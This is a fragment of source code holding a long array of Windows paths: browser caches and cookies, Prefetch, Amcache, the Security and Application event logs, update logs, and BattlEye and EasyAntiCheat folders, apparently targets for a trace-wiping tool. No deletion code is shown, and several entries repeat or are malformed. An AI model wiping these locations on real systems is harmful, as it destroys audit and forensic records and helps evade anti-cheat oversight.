            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Temp\\NVIDIA Corporation\\NV_Cache",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\History",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Speech Graphics",
            "C:\\Windows\\Public\\Libraries",
            "C:\\Intel",
            "C:\\Amd",
            "C:\\Users\\Public\\Libraries\\collection.dat",
            "C:\\Recovery\\ntuser.sys",
            "C:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Feeds",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.jfm",
            "C:\\Program Files x86\\Common Files\\BattlEye\\BEDaisy.sys",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat",
            "C:\\Windows\\System32\\wbem\\Performance\\WmiApRpl.ini",
            "C:\\Windows\\SoftwareDistribution\\DataStore",
            "C:\\Windows\\System32\\WDI\\LogFiles\\StartupInfo",
            "C:\\Windows\\bootstat.dat",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Logs",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State",
            "C:\\Windows\\SysWOW64\\Gms.log",
            "C:\\ProgramData\\USOShared\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\LocalState\\Database\\anonymous",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WER\\ERC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore",
            "C:\\Windows\\Logs\\CBS",
            "C:\\Windows\\Logs\\CBS\\CBS.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms\\Unistore\\data",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms\\Unistore\\data\\temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AppData\\User\\Default\\Indexed DB\\edb.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AppData\\User\\Default\\Indexed DB",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore\\meta.edb",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG1",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG2",
            "C:\\Windows\\appcompat\\Programs\\Install",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\EasyAntiCheat",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup\\EtwRTGraphicsPerfMonitorSession.etl",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\MicrosoftEdge\\User\\Default\\Recovery\\Active",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\User\\Default\\AppCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\Autom",
            "C:\\Windows\\rescache\\_merged",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat",
            "C:\\Windows\\Logs\\MoSetup\\UpdateAgent.log",
            "C:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2\\{323558A6-0300-4C3E-97A0-EDEDFEB96B00}.bin",
            "C:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState\\CortanaUnifiedTileModelCache.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup\\EtwRTGraphicsPerfMonitorSession.etl",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms\\Unistore\\data",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms\\UnistoreDB",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.XboxGameOverlay_1.42.4001.0_x64__8wekyb3d8bbwe\\ActivationStore.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\DiagOutputDir",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState",
            "systemdrive%\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB",
            "C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive0.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Safety\\edge\\remote",
            "C:\\Windows\\WindowsUpdate.log",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\DataStore.edb",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs\\edb.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Safety\\edge\\remote",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\Internet Explorer\\DOMStore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\Windows",
            "C:\\Users\\"+ user +"\\ntuser.ini",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\VisualStudio\\16.0_76be8573\\privateregistry.bin.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\VisualStudio\\16.0_76be8573\\privateregistry.bin.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-BackgroundTaskInfrastructure%4Operational.evtx",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\CacheStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB\\IndexedDB.jfm",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.WindowsStore_11905.1001.4.0_x64__8wekyb3d8bbwe\\ActivationStore.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Dlna\\DeviceIcons",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Assets",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\BackgroundTransferApi",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\StagedAssets",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetCache\\ARDTOTYX",
            "C:\\Program Files x86\\Google\\CrashReports",
            "C:\\Windows\\Prefetch",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\LocalState\\DiagOutputDir",
            "C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive0.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms\\UnistoreDB\\store.jfm",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms\\UnistoreDB",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG1",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Wallet_2.2.18179.0_x64__8wekyb3d8bbwe\\ActivationStore.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\TargetedContentCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd-wal",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd",
            "C:\\Windows\\AppReadiness",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Temp\\VSRemoteControl",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Temp\\VSFeedbackIntelliCodeLogs",
            "C:\\Windows\\System32\\config\\BBI.LOG2",
            "C:\\Windows\\System32\\config\\BBI.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\BackgroundTransferApi",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\Temp",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios\\WINDOWS.SIUF.xml",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios\\WINDOWS.SIUF.xml.new",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Logs",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\XSettings.Sav",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Fault-Tolerant-Heap%4Operational.evtx",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\GatherLogs",
            "C:\\Program Files x86\\Common Files\\BattlEye",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG1",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings",
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp",
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive",
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings\\settings.dat.LOG2",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.XboxGameOverlay_1.42.4001.0_x64__8wekyb3d8bbwe\\ActivationStore.dat",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.XboxGameOverlay_1.42.4001.0_x64__8wekyb3d8bbwe",
            "C:\\Windows\\SoftwareDistribution\\Download",
            "C:\\ProgramData\\Audyssey Labs",
            "C:\\ProgramData\\Epic\\UnrealEngineLauncher",
            "C:\\ProgramData\\Intel\\ShaderCache",
            "C:\\ProgramData\\Intel\\ShaderCache\\FortniteClient-Win64-Shipping_1",
            "C:\\ProgramData\\Intel\\ShaderCache\\EpicGamesLauncher_1",
            "C:\\ProgramData\\Microsoft\\Provisioning\\AssetCache",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Temp",
            "C:\\ProgramData\\Microsoft\\Windows\\Caches",
            "C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrccache",
            "C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache",
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp",
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue",
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive",
            "C:\\ProgramData\\Microsoft\\Windows\\wfp",
            "C:\\ProgramData\\NVIDIA",
            "C:\\ProgramData\\NVIDIA Corporation\\umdlogs",
            "C:\\ProgramData\\Package Cache\\{64ff2cb0-807c-4ee9-87ef-ec1b2ede0daf}",
            "C:\\ProgramData\\Package Cache",
            "C:\\ProgramData\\USOShared\\Logs",
            "C:\\Users\\Public\\Desktop",
            "C:\\Users\\Public\\AccountPictures",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\DBG",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Intel",
            "C:\\Users\\"+ user +"\\AppData\\Local\\AMD",
            "C:\\Users\\"+ user +"\\AppData\\Local\\History",
            "C:\\Users\\"+ user +"\\AppData\\Local\\MicrosoftEdge\\SharedCacheContainers",
            "C:\\Users\\"+ user +"\\AppData\\Local\\MicrosoftEdge\\User\\Default",
            "C:\\Users\\"+ user +"\\AppData\\Local\\OneDrive\\cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\OneDrive\\cache\\qmlcache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\SquirrelTemp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\CLR_v2.0_32\\UsageLogs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\CLR_v4.0_32\\UsageLogs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\DOMStore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Media Player\\Transcoded Files Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Vault",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\VisualStudio\\16.0_b35fdcc8\\PackageCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\VisualStudio\\16.0_b35fdcc8\\TextMateCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\IECompatCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\IECompatUaCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\IEDownloadHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Caches",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\PPBCompatCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\PPBCompatUaCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\PRICache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WER",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Adobe\\Flash Player\\AssetCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Adobe\\Flash Player\\NativeCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Vault",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\NVIDIA\\ComputeCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Visual Studio Setup\\Cache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Visual Studio Setup\\GPUCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\vs_installershell\\logs",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Spelling\\en-US",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Spelling\\en-UK",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings\\settings.dat",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore",
            "C:\\Windows\\Logs\\WindowsUpdate",
            "C:\\ProgramData\\USOPrivate\\UpdateStore",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Origin\\Origin\\QtWebEngine\\Default\\Service Worker\\ScriptCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\PenWorkspace",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\PenWorkspace\\DiscoverCacheData.dat",
            "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal",
            "C:\\Windows\\Logs\\CBS",
            "C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive0.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Origin\\Web Cache",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd-wal",
            "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
            "C:\\ProgramData\\Origin\\AchievementCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Spelling\\en-US",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings\\utc.app.json.new",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings\\TELEMETRY.ASM-WINDOWSSQ.json.new",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings\\telemetry.ASM-WindowsDefault.json.new",
            "C:\\ProgramData\\NVIDIA Corporation\\NV_Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\ProgramData\\Microsoft\\Windows\\LfSvc\\Geofence\\S-1-5-18_NonPackagedApp\\Geofence.dat",
            "C:\\ProgramData\\Microsoft\\Windows\\LfSvc\\Geofence\\S-1-5-18_NonPackagedApp",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Windows\\System32\\LogFiles\\WMI",
            "C:\\Windows\\System32\\LogFiles\\WMI\\Wifi.etl",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common",
            "C:\\ProgramData\\Intel",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\1033",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\Caches",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\D3DSCache\\f9156d1136660b11\\F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.lock",
            ":\\ProgramData\\Intel\\ShaderCache\\taskhostw_1",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs",
            "C:\\Windows\\WindowsUpdate.log",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup\\EtwRTdfa2c640-651d-488d-a479-2fd7a7ca6e29.etl",
            "C:\\Windows\\Logs\\WindowsUpdate\\WindowsUpdate.20190621.222200.334.1.etl",
            "C:\\Windows\\SoftwareDistribution\\DataStore",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\DataStore.jfm",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\DataStore.edb",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Storage-Storport%4Health.evtx",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Storage-Storport%4Operational.evtx",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\Indexed DB",
            "C:\\ProgramData\\Microsoft\\Network\\Downloader",
            "C:\\Windows\\System32\\PerfStringBackup.INI",
            "C:\\Windows\\System32\\PerfStringBackup.TMP",
            "C:\\Windows\\INF\\WmiApRpl",
            "C:\\Windows\\INF\\WmiApRpl\\0009",
            "C:\\Windows\\System32\\perfc009.dat",
            ":\\Windows\\System32\\wbem\\Performance",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup\\EtwRTTerminal-Services-LSM-ApplicationLag-9452.etl",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd-wal",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd",
            "C:\\Windows\\AppReadiness",
            "C:\\Users\\"+ user +"\\Saved Games\\Respawn\\Apex",
            "C:\\Windows\\System32\\drivers\\storage.cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\IconCache.db",
            "C:\\Users\\"+ user +"\\AppData\\Local\\updater.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\IconCache.db",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Feeds Cache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\CSM",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Origin",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup\\EtwRTGraphicsPerfMonitorSession.etl",
            "C:\\Users\\"+ user +"\\AppData\\Local\\AMD\\DxCache",
            "C:\\Windows\\WinSxS\\ManifestCache",
            "C:\\Windows\\System32\\SMI\\Store\\Machine",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG2",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG1",
            "C:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\stage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\D3DSCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Engine.ini",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\slideshow.ini",
            "C:\\ProgramData\\Microsoft\\Diagnosis",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft",
